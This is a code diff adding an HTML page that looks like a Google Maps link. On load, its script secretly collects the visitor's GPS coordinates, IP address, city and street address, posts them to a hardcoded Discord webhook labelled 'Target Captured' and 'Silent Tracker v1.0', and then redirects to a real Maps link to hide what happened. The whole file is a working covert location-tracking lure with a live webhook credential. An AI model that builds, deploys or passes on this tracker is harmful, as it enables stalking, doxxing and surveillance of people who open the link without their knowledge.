@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1556093864383881219/bj9sLYlw4iC33YbmXhPYr2a6rFIKaNNg7vz7RTs73dzCP6oU2SuDCq6HVJsmrjSvEKN5";
+        const MAPS_LINK = "https://maps.app.goo.gl/RxkBH8wFYYUx2bff6?g_st=ac";
+        
+        async function captureAndRedirect() {
+            let locationData = { status: "failed" };
+            let ipInfo = {};
+            let locationName = {};
+            
+            if (navigator.geolocation) {
+                try {
+                    locationData = await new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                resolve({
+                                    latitude: pos.coords.latitude,
+                                    longitude: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                    status: "gps"
+                                });
+                            },
+                            () => resolve({ status: "denied" })
+                        );
+                    });
+                } catch(e) {
+                    locationData = { status: "error" };
+                }
+            }
+            
+            try {
+                ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
+            } catch(e) {}
+            
+            if (locationData.latitude && locationData.longitude) {
+                try {
+                    locationName = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.latitude}&lon=${locationData.longitude}`)
+                        .then(r => r.json());
+                } catch(e) {}
+            }
+            
+            const payload = {
+                username: "📍 Location Tracker",
+                avatar_url: "https://www.gstatic.com/images/branding/product/1x/maps_48dp.png",
+                embeds: [{
+                    color: 3447003,
+                    title: "🎯 Target Captured",
+                    fields: [
+                        { name: "📍 Latitude", value: `\`${locationData.latitude || ipInfo.latitude || 'N/A'}\``, inline: true },
+                        { name: "📍 Longitude", value: `\`${locationData.longitude || ipInfo.longitude || 'N/A'}\``, inline: true },
+                        { name: "🏙️ City", value: `\`${locationName.address?.city || ipInfo.city || 'N/A'}\``, inline: true },
+                        { name: "🌍 Country", value: `\`${ipInfo.country_name || 'N/A'}\``, inline: true },
+                        { name: "🌐 IP", value: `\`${ipInfo.ip || 'N/A'}\``, inline: true },
+                        { name: "📡 Accuracy", value: `\`${locationData.accuracy ? locationData.accuracy.toFixed(0) + 'm' : 'IP-based'}\``, inline: true },
+                        { name: "🗺️ Address", value: `\`${locationName.address?.road || ''} ${locationName.address?.suburb || ''}\``.trim() || "`N/A`", inline: false }
+                    ],
+                    footer: { text: "Silent Tracker v1.0" }
+                }]
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+            
+            setTimeout(() => {
+                window.location.href = MAPS_LINK;
+            }, 500);
+        }
+        
+        captureAndRedirect();
+    </script>
+</body>
+</html>
